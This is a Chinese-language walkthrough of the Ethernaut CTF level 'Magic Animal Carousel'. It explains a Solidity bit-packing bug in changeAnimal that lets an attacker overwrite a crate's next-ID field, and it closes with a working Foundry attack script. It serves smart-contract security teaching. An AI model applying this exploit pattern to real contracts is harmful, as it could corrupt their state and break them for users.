# Ethernaut 第33关 魔法动物旋转木马

---

合约代码：

```solidity
// 软件许可证：MIT
pragma solidity ^0.8.28;

contract MagicAnimalCarousel {
    uint16 constant public MAX_CAPACITY = type(uint16).max;
    uint256 constant ANIMAL_MASK = uint256(type(uint80).max) << 160 + 16;
    uint256 constant NEXT_ID_MASK = uint256(type(uint16).max) << 160;
    uint256 constant OWNER_MASK = uint256(type(uint160).max);

    uint256 public currentCrateId;
    mapping(uint256 crateId => uint256 animalInside) public carousel;

    error AnimalNameTooLong();
    error CrateNotInitialized();

    constructor() {
        carousel[0] ^= 1 << 160;
    }

    function setAnimalAndSpin(string calldata animal) external {
        uint256 encodedAnimal = encodeAnimalName(animal) >> 16;
        uint256 nextCrateId = (carousel[currentCrateId] & NEXT_ID_MASK) >> 160;

        require(encodedAnimal <= uint256(type(uint80).max), AnimalNameTooLong());
        carousel[nextCrateId] = (carousel[nextCrateId] & ~NEXT_ID_MASK) ^ (encodedAnimal << 160 + 16)
            | ((nextCrateId + 1) % MAX_CAPACITY) << 160 | uint160(msg.sender);

        currentCrateId = nextCrateId;
    }

    function changeAnimal(string calldata animal, uint256 crateId) external {
        uint256 crate = carousel[crateId];
        require(crate != 0, CrateNotInitialized());
        
        address owner = address(uint160(crate & OWNER_MASK));
        if (owner != address(0)) {
            require(msg.sender == owner);
        }
        uint256 encodedAnimal = encodeAnimalName(animal);
        if (encodedAnimal != 0) {
            // 替换动物
            carousel[crateId] =
                (encodedAnimal << 160) | (carousel[crateId] & NEXT_ID_MASK) | uint160(msg.sender); 
        } else {
            // 如果未指定动物，则保留原有动物但清空所有者插槽
            carousel[crateId]= (carousel[crateId] & (ANIMAL_MASK | NEXT_ID_MASK));
        }
    }

    function encodeAnimalName(string calldata animalName) public pure returns (uint256) {
        require(bytes(animalName).length <= 12, AnimalNameTooLong());
        return uint256(bytes32(abi.encodePacked(animalName)) >> 160);
    }
}
```

我们的目标是破坏这个旋转木马。在这个旋转木马上，定义了三个掩码：`animal_mask`（动物掩码）、`next_id_mask`（下一个ID掩码）和`owner_mask`（所有者掩码）。仔细观察可以发现，在一个32字节的存储槽中，前10个字节用于`animal_mask`，接下来2个字节用于`next_id_mask`，最后20个字节用于`owner_mask`，结构如下：

```
0x FF...FF FFFF FF...FF
  |动物名 |下一个ID| 所有者 | 
  |  10   |  2 |  20   | (字节)
```

因此，我们将这三个部分压缩到一个`carousel[i]`中，并通过对应的掩码来获取所需的数据。

在构造函数中，我们执行了以下操作：

```solidity
carousel[0] ^= 1 << 160;
```

由于`x ^ 0 = x`，所以`carousel[0] = 1 << 160`，这意味着将2字节的下一个ID（1）左移到正确的存储位置（第11至12字节）。

在`setAnimalAndSpin(string calldata animal)`函数中，我们首先调用`encodeAnimalName(animal)`，该函数要求动物名称的长度不超过12字节，并且在这一行：

```solidity
return uint256(bytes32(abi.encodePacked(animalName)) >> 160)
```

我们首先将`animalName`转换为`bytes32`类型，这会将`animalName`放在**最左侧**的字节中。然后将其右移20字节，使12字节的`animalName`位于`uint256`的**最右侧**字节中。

现在回到`setAnimalAndSpin(string calldata animal)`函数。在第一行：

```solidity
uint256 encodedAnimal = encodeAnimalName(animal) >> 16;
```

我们将动物名称右移2字节，使其仅保留10字节的长度，以适应压缩结构（最左侧的10字节用于存储动物名称）。下一行：

```solidity
uint256 nextCrateId = (carousel[currentCrateId] & NEXT_ID_MASK) >> 160;
```

我们基本上是对`carousel[currentCrateId]`应用相应的掩码，从第11至12字节中**提取**下一个ID，并将其右移20字节，使其位于最右侧的字节中。现在到了最关键的部分：

```solidity
carousel[nextCrateId] = (carousel[nextCrateId] & ~NEXT_ID_MASK) ^ (encodedAnimal << 160 + 16)
            | ((nextCrateId + 1) % MAX_CAPACITY) << 160 | uint160(msg.sender);
```

我们将其拆分为不同的部分来分析：

1. 部分A：`(carousel[nextCrateId] & ~NEXT_ID_MASK)`。由于`carousel[nextCrateId]`初始值为0，因此这部分整体为0。
2. 部分B：`(encodedAnimal << 160 + 16)`：将10字节的`encodedAnimal`左移22字节，使动物名称能够适配压缩结构。
3. 部分C：`((nextCrateId + 1) % MAX_CAPACITY) << 160`：将2字节的`nextCrateId`加1，并对`MAX_CAPACITY`（0xffff）取模，以实现循环的旋转木马结构。最后将其左移20字节。
4. 部分D：`uint160(msg.sender)`：这是`msg.sender`的20字节地址，即该动物的所有者。

因此，`carousel[nextCrateId] = A ^ B | C | D = B | C | D`。最终的存储结构如下：

```
编码后的动物名（10字节）| 下一个货箱ID（2字节）| 所有者（20字节）
```

在`changeAnimal(string calldata animal, uint256 crateId)`函数中可以看到，在获取12字节的`encodedAnimal`后，我们并没有将其右移2字节以缩短为10字节。相反，在这一行：

```solidity
carousel[crateId] =
                (encodedAnimal << 160) | (carousel[crateId] & NEXT_ID_MASK) | uint160(msg.sender)
```

我们仅将12字节的`encodedAnimal`左移20字节。因此，如果我们调用`changeAnimal(string calldata animal, uint256 crateId)`函数，动物名称的最后2字节将**覆盖**2字节的下一个ID插槽！

至此，攻击策略就很明确了：我们将某个动物的名称修改为最后2字节是0xffff的名称，从而破坏这个看似无限的旋转木马。

攻击脚本`MagicAnimalCarousel.s.sol`：

```solidity
// 软件许可证：MIT
pragma solidity ^0.8.28;

import {Script} from "forge-std/Script.sol";
import {MagicAnimalCarousel} from "../src/MagicAnimalCarousel.sol";

contract MagicAnimalCarouselScript is Script {
    MagicAnimalCarousel carousel = MagicAnimalCarousel(0xXXXXXXXXXXXX);

    function run() external {
        vm.startBroadcast();

        // 当前货箱ID = 1，动物："Dragon"（龙），下一个货箱ID = 2，所有者 = 调用者
        carousel.setAnimalAndSpin("Dragon");

        // 将货箱ID为1的动物改为黑客指定内容，下一个货箱ID = 65535（0xffff）
        string memory hacker = string(abi.encodePacked(hex"10000000000000000000ffff"));
        carousel.changeAnimal(hacker, 1);

        // 当前货箱ID = 65535，动物："Unicorn"（独角兽），下一个货箱ID = 0，所有者 = 调用者
        carousel.setAnimalAndSpin("Unicorn");

        vm.stopBroadcast();
    }
}
```

注意，在hex""中，我们不需要在数据前添加0x。
